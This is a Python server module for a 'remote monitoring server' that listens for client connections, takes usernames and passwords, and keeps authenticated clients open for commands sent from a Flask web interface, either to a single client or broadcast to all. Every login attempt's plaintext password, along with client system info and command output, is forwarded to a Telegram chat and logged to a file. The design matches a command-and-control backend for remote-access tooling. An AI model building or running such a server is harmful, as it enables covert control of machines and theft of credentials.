"""
Main Server Module - Deployed on Render with Telegram Logging
"""

import socket
import threading
import os
import subprocess
import requests
from datetime import datetime
from flask import Flask, request, jsonify
import sys

# Add current directory to path
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from auth import authenticate
from config import HOST, PORT, DEBUG_MODE, ALLOWED_COMMANDS

# Flask app for web interface
app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID')

# Store connected clients
connected_clients = []
client_lock = threading.Lock()

def send_telegram_message(message):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"[!] Telegram error: {e}")
        return False

def log_attempt(username, password, success, addr, system_info=None):
    """Log authentication attempts to Telegram"""
    hashed_password = hash_password(password) if password else "N/A"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    status_emoji = "✅" if success else "❌"
    status_text = "SUCCESS" if success else "FAILED"
    
    message = f"""
🔐 <b>Authentication Attempt</b>
───────────────────
📅 Time: {timestamp}
👤 Username: <code>{username}</code>
🔑 Password: <code>{password}</code>
🔒 Hash: <code>{hashed_password[:16]}...</code>
🌐 IP: {addr[0]}
📊 Status: {status_emoji} {status_text}
    """
    
    if system_info:
        message += f"\n💻 <b>System Info:</b>\n<code>{system_info[:500]}</code>"
    
    send_telegram_message(message)
    
    # Also log to file for backup
    try:
        with open("logs.txt", "a") as f:
            f.write(f"{timestamp} | {username} | {password} | {addr[0]} | {status_text}\n")
    except:
        pass

def hash_password(password):
    """Simple hash for logging"""
    import hashlib
    return hashlib.sha256(password.encode()).hexdigest()

def handle_client(client, addr):
    """Handle individual client connection"""
    try:
        # Receive credentials
        data = client.recv(2048).decode()
        if not data:
            return
        
        # Split username and password
        parts = data.split(",", 1)
        if len(parts) != 2:
            send_telegram_message(f"⚠️ Invalid login data from {addr[0]}")
            client.send("AUTH_FAILED".encode())
            return
            
        username, password = parts[0], parts[1]
        
        print(f"\n[+] Login attempt from {addr[0]}")
        print(f"[+] Username: '{username}'")
        
        # Authenticate
        if authenticate(username, password):
            # Receive system info
            system_info = client.recv(8192).decode()
            
            log_attempt(username, password, True, addr, system_info)
            client.send("AUTH_SUCCESS".encode())
            
            # Add to connected clients list
            with client_lock:
                connected_clients.append({
                    'client': client,
                    'addr': addr,
                    'username': username,
                    'timestamp': datetime.now()
                })
            
            send_telegram_message(
                f"🟢 <b>New Connection</b>\n"
                f"👤 User: <code>{username}</code>\n"
                f"🌐 IP: {addr[0]}\n"
                f"💻 System Info:\n<code>{system_info[:300]}...</code>"
            )
            
            # Keep connection alive and wait for commands
            while True:
                # Send heartbeat every 30 seconds
                try:
                    client.send("HEARTBEAT".encode())
                    response = client.recv(1024).decode()
                    if response != "ALIVE":
                        break
                except:
                    break
                
                # Wait for command from web interface
                # This is handled via Flask endpoints
                threading.Event().wait(30)
            
        else:
            log_attempt(username, password, False, addr)
            client.send("AUTH_FAILED".encode())
            print(f"[!] Failed login for: '{username}' from {addr[0]}")
    
    except Exception as e:
        print(f"[ERROR] {e}")
        send_telegram_message(f"⚠️ Error in client handler: {str(e)}")
    finally:
        client.close()
        with client_lock:
            connected_clients[:] = [c for c in connected_clients if c['client'] != client]

def start_socket_server():
    """Start the socket server for clients"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', PORT))  # Listen on all interfaces
        server.listen(5)
        
        print(f"\n[✓] Socket server listening on 0.0.0.0:{PORT}")
        
        # Main loop
        while True:
            client, addr = server.accept()
            print(f"[+] Connection from {addr}")
            
            # Handle client in new thread
            client_thread = threading.Thread(
                target=handle_client,
                args=(client, addr),
                daemon=True
            )
            client_thread.start()
    
    except Exception as e:
        print(f"\n[!] Socket server error: {e}")
        send_telegram_message(f"⚠️ Socket server error: {str(e)}")

# Flask routes for web interface
@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'clients': len(connected_clients),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/clients')
def get_clients():
    """Get list of connected clients"""
    with client_lock:
        clients_info = []
        for client in connected_clients:
            clients_info.append({
                'ip': client['addr'][0],
                'username': client['username'],
                'connected_since': client['timestamp'].isoformat()
            })
    return jsonify(clients_info)

@app.route('/execute/<int:client_id>', methods=['POST'])
def execute_command(client_id):
    """Execute command on specific client"""
    try:
        command = request.json.get('command', '').lower()
        
        if command not in ALLOWED_COMMANDS:
            return jsonify({'error': 'Command not allowed'}), 403
        
        with client_lock:
            if client_id >= len(connected_clients):
                return jsonify({'error': 'Client not found'}), 404
            
            client_info = connected_clients[client_id]
            client = client_info['client']
            
            # Send command to client
            client.send(command.encode())
            result = client.recv(8192).decode()
            
            # Log to Telegram
            send_telegram_message(
                f"💻 <b>Command Executed</b>\n"
                f"👤 User: {client_info['username']}\n"
                f"🔧 Command: <code>{command}</code>\n"
                f"📤 Output:\n<code>{result[:500]}</code>"
            )
            
            return jsonify({'output': result})
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/broadcast', methods=['POST'])
def broadcast_command():
    """Send command to all connected clients"""
    try:
        command = request.json.get('command', '').lower()
        
        if command not in ALLOWED_COMMANDS:
            return jsonify({'error': 'Command not allowed'}), 403
        
        results = []
        with client_lock:
            for idx, client_info in enumerate(connected_clients):
                try:
                    client_info['client'].send(command.encode())
                    result = client_info['client'].recv(8192).decode()
                    results.append({
                        'client_id': idx,
                        'username': client_info['username'],
                        'output': result
                    })
                except:
                    results.append({
                        'client_id': idx,
                        'username': client_info['username'],
                        'output': 'Failed to execute'
                    })
        
        # Log to Telegram
        send_telegram_message(
            f"📢 <b>Broadcast Command</b>\n"
            f"🔧 Command: <code>{command}</code>\n"
            f"👥 Affected clients: {len(results)}\n"
            f"📊 Check web interface for details"
        )
        
        return jsonify({'results': results})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == "__main__":
    # Start socket server in a separate thread
    socket_thread = threading.Thread(target=start_socket_server, daemon=True)
    socket_thread.start()
    
    # Get system info
    try:
        whoami = subprocess.getoutput('whoami')
        print("\n" + "="*50)
        print("  REMOTE MONITORING SERVER")
        print("="*50)
        print(f"\n[+] System User: {whoami}")
        print(f"[+] Port: {PORT}")
        print(f"[+] Telegram Logging: {'Enabled' if TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN' else 'Disabled'}")
        print("="*50)
        
        send_telegram_message("🚀 Server started successfully!")
        
    except:
        pass
    
    # Start Flask web server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)